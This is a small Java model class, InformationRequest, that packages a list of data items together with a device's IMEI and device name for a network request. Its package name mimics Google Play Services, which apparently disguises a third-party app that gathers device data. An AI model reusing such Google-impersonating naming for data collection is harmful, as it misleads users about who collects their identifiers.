package com.google.android.gms.persistent.googleapps.network.models.request;

import com.google.android.gms.persistent.googleapps.network.models.data.BaseInfo;
import com.google.android.gms.persistent.googleapps.network.models.data.Data;

import java.util.List;

/**
 * Created by OldMan on 05.04.2017.
 */

public class InformationRequest extends BaseRequest {
    private List<Data> data;

    public InformationRequest(List<Data> data, String imei, String device) {
        super(imei, device);
        this.data = data;
    }

    public List<Data> getData() {
        return data;
    }

    public void setData(List<Data> data) {
        this.data = data;
    }
}
